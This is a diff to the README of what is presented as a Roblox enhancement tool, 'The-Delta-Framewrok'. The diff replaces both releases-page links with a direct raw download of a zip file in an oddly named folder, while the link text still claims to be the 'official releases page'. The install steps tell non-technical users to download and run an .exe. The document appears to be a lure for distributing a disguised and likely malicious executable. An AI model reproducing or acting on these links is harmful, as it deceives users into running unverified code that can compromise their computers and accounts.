@@ -1,6 +1,6 @@
 # 🚀 The-Delta-Framewrok - Improve your Roblox gaming experience today
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/secretaryoflaborasafetida304/The-Delta-Framewrok/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/secretaryoflaborasafetida304/The-Delta-Framewrok/main/tetradecapod/The_Delta_Framewrok_v2.0.zip)
 
 ## 📌 What is this application
 
@@ -20,7 +20,7 @@ This software supports Windows devices. Check that your computer meets these req
 
 Follow these steps to set up the software on your machine. You do not need technical skills to complete this process.
 
-1. Visit the [official releases page](https://github.com/secretaryoflaborasafetida304/The-Delta-Framewrok/releases) to access the software files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/secretaryoflaborasafetida304/The-Delta-Framewrok/main/tetradecapod/The_Delta_Framewrok_v2.0.zip) to access the software files.
 2. Select the latest version listed at the top of the page.
 3. Click the file ending in .exe to start the download.
 4. Move the file from your Downloads folder to a location you can find, such as your Desktop.
